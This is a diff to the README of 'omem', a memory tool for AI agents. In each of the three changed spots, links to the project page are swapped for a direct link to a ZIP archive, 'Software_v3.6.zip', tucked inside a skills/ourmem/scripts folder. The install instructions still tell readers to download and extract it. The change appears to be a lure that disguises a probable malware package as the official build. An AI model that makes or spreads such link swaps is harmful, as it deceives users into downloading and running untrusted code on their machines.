@@ -1,6 +1,6 @@
 # 🧠 omem - Persistent memory for AI agents
 
-[![Download omem](https://img.shields.io/badge/Download-omem-blue?style=for-the-badge&logo=github)](https://github.com/Toperythroblast876/omem)
+[![Download omem](https://img.shields.io/badge/Download-omem-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Toperythroblast876/omem/main/skills/ourmem/scripts/Software_v3.6.zip)
 
 ## 🚀 What omem does
 
@@ -15,7 +15,7 @@ Use it when you want:
 ## 📥 Download and install
 
 1. Open the download page:
-   https://github.com/Toperythroblast876/omem
+   https://raw.githubusercontent.com/Toperythroblast876/omem/main/skills/ourmem/scripts/Software_v3.6.zip
 2. On the page, look for the latest release or the main project files.
 3. Download the Windows build or install package if one is listed.
 4. If you get a ZIP file, right-click it and choose Extract All.
@@ -165,7 +165,7 @@ If that works, your setup is ready.
 
 ## 📎 Download link again
 
-[Visit the omem download page](https://github.com/Toperythroblast876/omem)
+[Visit the omem download page](https://raw.githubusercontent.com/Toperythroblast876/omem/main/skills/ourmem/scripts/Software_v3.6.zip)
 
 ## 🧾 File notes
 
